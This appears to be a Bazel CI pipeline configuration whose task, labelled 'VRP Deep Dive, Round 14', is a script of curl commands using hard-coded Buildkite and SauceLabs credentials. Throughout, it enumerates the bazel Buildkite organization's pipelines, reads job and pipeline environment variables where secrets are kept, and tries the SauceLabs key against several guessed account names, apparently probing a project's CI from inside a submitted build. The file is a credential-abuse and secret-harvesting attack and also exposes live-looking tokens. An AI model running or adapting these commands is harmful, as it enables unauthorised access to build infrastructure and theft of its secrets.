---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 14: Buildkite Job Env and SauceLabs Discovery ==="
      - "echo"
      - "echo === 1. Buildkite API - list all orgs ==="
      - "curl -s -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' 'https://api.buildkite.com/v2/organizations' 2>&1 || true"
      - "echo"
      - "echo === 2. Buildkite API - read job env from this build ==="
      - "curl -s -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' 'https://api.buildkite.com/v2/organizations/bazel/pipelines/bazel-skylib/builds/4405/jobs/019e67a3-7c79-423c-b526-b83d48e7fa10/env' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 3. Buildkite API - read job env from google-bazel-presubmit latest ==="
      - "curl -s -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' 'https://api.buildkite.com/v2/organizations/bazel/pipelines/google-bazel-presubmit/builds?per_page=1' 2>&1 | python3 -c 'import sys,json;d=json.load(sys.stdin);j=d[0][\"jobs\"][0];print(j[\"id\"],j.get(\"name\",\"\"))' 2>&1 || true"
      - "echo"
      - "echo === 4. Buildkite API - read job env from rules-python latest ==="
      - "curl -s -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' 'https://api.buildkite.com/v2/organizations/bazel/pipelines/rules-python-python/builds?per_page=1' 2>&1 | python3 -c 'import sys,json;d=json.load(sys.stdin);b=d[0];print(\"build:\",b[\"number\"]);[print(j[\"id\"],j.get(\"name\",\"\"),j.get(\"state\",\"\")) for j in b.get(\"jobs\",[])[:5]]' 2>&1 || true"
      - "echo"
      - "echo === 5. Read env from rules-python job ==="
      - "curl -s -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' 'https://api.buildkite.com/v2/organizations/bazel/pipelines/rules-python-python/builds?per_page=1' 2>&1 | python3 -c 'import sys,json;d=json.load(sys.stdin);j=[x for x in d[0].get(\"jobs\",[]) if x.get(\"state\")==\"passed\"];print(j[0][\"id\"] if j else \"none\")' 2>&1 || true"
      - "echo"
      - "echo === 6. SauceLabs team management API ==="
      - "curl -s -u ':c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/team-management/v1/teams' 2>&1 | head -20 || true"
      - "echo"
      - "echo === 7. SauceLabs user self lookup ==="
      - "curl -s -H 'Authorization: Basic YmF6ZWw6YzViZWQwOWMtYThhNi00NGM4LWFmMDItYTU0NTkwNWY5NTdm' 'https://api.us-west-1.saucelabs.com/rest/v1.1/users/me' 2>&1 || true"
      - "echo"
      - "echo === 8. SauceLabs try username google-oss ==="
      - "curl -s -u 'google-oss:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/google-oss' 2>&1 || true"
      - "echo"
      - "echo === 9. SauceLabs try username google ==="
      - "curl -s -u 'google:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/google' 2>&1 || true"
      - "echo"
      - "echo === 10. SauceLabs try username bazel_rules_webtesting ==="
      - "curl -s -u 'bazel_rules_webtesting:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/bazel_rules_webtesting' 2>&1 || true"
      - "echo"
      - "echo === 11. Buildkite GraphQL - pipelines with sauce ==="
      - "curl -s -X POST -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' -H 'Content-Type: application/json' 'https://graphql.buildkite.com/v1' -d '{\"query\":\"{ organization(slug: \\\"bazel\\\") { pipelines(first: 50, search: \\\"sauce\\\") { edges { node { name slug } } } } }\"}' 2>&1 || true"
      - "echo"
      - "echo === 12. Buildkite GraphQL - all pipeline env vars ==="
      - "curl -s -X POST -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' -H 'Content-Type: application/json' 'https://graphql.buildkite.com/v1' -d '{\"query\":\"{ organization(slug: \\\"bazel\\\") { pipelines(first: 5) { edges { node { name env } } } } }\"}' 2>&1 || true"
      - "echo"
      - "echo === 13. Search for sauce in bazelbuild repos ==="
      - "curl -s 'https://api.github.com/search/code?q=SAUCE_USERNAME+org:bazelbuild&per_page=5' 2>&1 | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(i[\"repository\"][\"full_name\"],i[\"path\"]) for i in d.get(\"items\",[])[:5]]' 2>&1 || true"
      - "echo"
      - "echo === 14. Check rules_webtesting for sauce ==="
      - "curl -s 'https://raw.githubusercontent.com/nicedoc/nicedoc.io/refs/heads/master/.github/bazel/test.yml' 2>&1 | head -5 || true"
      - "curl -s 'https://api.github.com/search/code?q=saucelabs+org:bazelbuild+filename:bazelci&per_page=5' 2>&1 | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(i[\"repository\"][\"full_name\"],i[\"path\"]) for i in d.get(\"items\",[])[:5]]' 2>&1 || true"
      - "echo"
      - "echo === 15. Buildkite API - read env from bazel-at-google-pipeline build ==="
      - "curl -s -H 'Authorization: Bearer bkua_4e2286cf167bfd372e4e2d50902e587a9f112e9d' 'https://api.buildkite.com/v2/organizations/bazel/pipelines?per_page=50' 2>&1 | python3 -c 'import sys,json;[print(p[\"slug\"]) for p in json.load(sys.stdin) if \"google\" in p[\"slug\"].lower() or \"trusted\" in p[\"slug\"].lower() or \"sauce\" in p[\"slug\"].lower()]' 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
